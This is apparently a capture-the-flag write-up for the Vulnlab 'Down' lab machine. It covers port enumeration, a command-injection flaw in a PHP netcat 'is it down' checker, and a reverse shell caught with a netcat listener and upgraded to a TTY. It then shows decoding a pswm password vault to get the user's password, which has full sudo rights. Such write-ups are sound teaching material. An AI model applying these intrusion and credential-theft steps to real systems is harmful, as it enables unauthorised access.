---
title: Vulnlab - Down
date: 2025-01-13 02:00:00 +/-TTTT
categories: [VulnLab]
tags: [pswm]     # TAG names should always be lowercase
---

![img-description](/assets/images/down_slide.png)

## Enum
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9eTcP2DDxJHJ2uCdOmMRIPaoOhvMFXL33f1pZTIe0VTdeHRNYlpm2a2PumsO5t88M7QF3L3d6n1eRHTTAskGw=
    |   256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
    |ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwLt0rmihlvq9pk6BmFhjTycNR54yApKIrnwI8xzYx/
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
    | http-methods:
    |  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Is it down or just me?
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### Website
![img-description](/assets/images/1.png)

for understand it clearly i will try to dump index.php and analyze source code.

![img-description](/assets/images/21.png)

![img-description](/assets/images/3.png)

### analyze code

![img-description](/assets/images/2025_01_12_0me_Kleki.png)

PHP code snippet accepts ip and port parameters via a POST request when expertmode=tcp is set in the GET parameters. It validates the ip and port inputs before using them in a shell command to perform a TCP connection check using nc (netcat). However, there are several issues that can lead to security vulnerabilities and functionality concerns
## user
![img-description](/assets/images/5.png)

    ➜  down nc -nvlp 443
    listening on [any] 443 ...
    connect to [10.8.2.152] from (UNKNOWN) [10.10.92.73] 49890
    ls
    index.php
    logo.png
    style.css
    user_aeT1xa.txt
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    www-data@down:/var/www/html$ export TERM=xterm
    export TERM=xterm
    www-data@down:/var/www/html$ ^Z
    [1]  + 150945 suspended  nc -nvlp 443
    ➜  down stty raw -echo;fg

    [1]  + 150945 continued  nc -nvlp 443

    www-data@down:/var/www/html$

### linpeas

    ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)

    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files

    [SNIP]
    /var/crash/_usr_bin_pswm.33.crash

    /var/www/html/user_aeT1xa.txt

    [SNIP]

thasts look like interesting

    www-data@down:/tmp$ cat /var/crash/_usr_bin_pswm.33.crash
    ProblemType: Crash
    Date: Fri Sep  6 15:01:16 2024
    ExecutablePath: /usr/bin/pswm
    ExecutableTimestamp: 1725633898
    InterpreterPath: /usr/bin/python3.10
    ProcCmdline: python3 /usr/bin/pswm

    PermissionError: [Errno 13] Permission denied: '/var/www/.local'

https://github.com/repo4Chu/pswm-decoder

we already know location before so just dump it

    www-data@down:/home/aleks/.local/share/pswm$ ls
    pswm

### pswm

    (myenv) ➜  down python3 pswm-decoder.py
    Password: flower
    Decoded text:
    pswm    aleks   flower
    aleks@down      aleks   1uY3w22u<redacted>

## root

    aleks@down:~$ sudo -l
    Matching Defaults entries for aleks on down:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

    User aleks may run the following commands on down:
    (ALL : ALL) ALL

